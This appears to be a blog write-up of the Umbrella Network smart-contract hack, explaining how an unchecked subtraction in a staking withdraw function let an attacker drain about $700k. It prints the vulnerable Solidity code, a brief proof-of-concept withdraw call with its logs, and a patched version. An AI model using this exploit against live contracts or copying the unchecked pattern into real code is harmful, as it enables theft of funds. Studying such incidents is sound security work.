# Umbrella

![hi Image](../images/umbrella/jo.avif)

## What's Umbrella?
Umbrella Network is a community owned, scalable and cost efficient oracle for the DeFi and blockchain community. 
Umbrella believes a community owned Oracle is not only possible, but essential to creating a truly decentralized financial system.

## Amount stolen
**$700k USD**



## Vulnerability
Underflow


## Analysis

The contract was exploited by underflow that occurred in withdrawal, The mechanism of underflow involves the binary representation of numbers. Consider a uint8, where the binary representation of 0 is 00000000. Subtracting 1 from it transforms the binary to 11111111, equivalent to 255 in decimal. Unlike a signed Integer (int8) that can be negative due to its first bit that indicates +/- :) 

So, if using _balances[user] = _balances[user] - amount;  is called without checks, and _balances[user] is 0, subtracting the amount will wrap around to the maximum value of the data type, not become negative and not fail in this case. 

So the transfer method will be called afterward and successfully drain the funds to the victim's wallet.


### Exploited code

```solidity
      function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant updateReward(user) {
        require(amount != 0, "Cannot withdraw 0");

        // not using safe math, because there is no way to overflow if stake tokens not overflow
        _totalSupply = _totalSupply - amount;
        _balances[user] = _balances[user] - amount;   //<---- underflow here.

        require(stakingTOken.transfer(recipent,amount),"token transfer failed");
      }
```

#### for example:

```
// Initial state
_totalSupply = 100;
_balances[user] = 0;
amount = 50;  // the amount to withdraw 

// After withdrawal
_totalSupply = _totalSupply - amount;  // 100 - 50 = 50
_balances[user] = _balances[user] - amount;  // 0 - 50 = underflow
```


# proof of concept (PoC) 


```solidity
       emit log_named_decimal_uint("Before exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);

       StakingRewards.withdraw(8_792_873_290_680_252_648_282); //without putting any crypto, we can drain out the LP tokens in uniswap pool by underflow.

       emit log_named_decimal_uint("After exploiting, Attacker UniLP Balance", uniLP.balanceOf(address(this)), 18);
```

Logs:
```
  Before exploiting, Attacker UniLP Balance: 0.000000000000000000
  After exploiting, Attacker UniLP Balance: 8792.873290680252648282
```


# Solution

The method `_withdraw` should check wether the user has enough balance, and/or to prevent underflow it can use the `safe math` library using `.sub` instead of a `-` sign

```solidity
  function _withdraw(uint256 amount, address user, address recipient) internal nonReentrant {
        require(amount != 0, "Cannot withdraw 0");
        require(_balances[user] >= amount, "Insufficient balance for withdrawal");

        // Use safe math to prevent underflow
        _totalSupply = _totalSupply.sub(amount);
        _balances[user] = _balances[user].sub(amount);

        require(stakingTOken.transfer(recipent,amount),"token transfer failed");
    }

```


# Summary

Underflows are extremely common in smart contracts and they should be prevented by the safemath library 
especially in methods involving transactions, to safeguard against underflows. While it may introduce 
additional gas costs, the security benefits far outweigh the risks associated with potential vulnerabilities 



**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Umbrella_exp.sol)


[**< Back**](https://patronasxdxd.github.io/CTFS/)
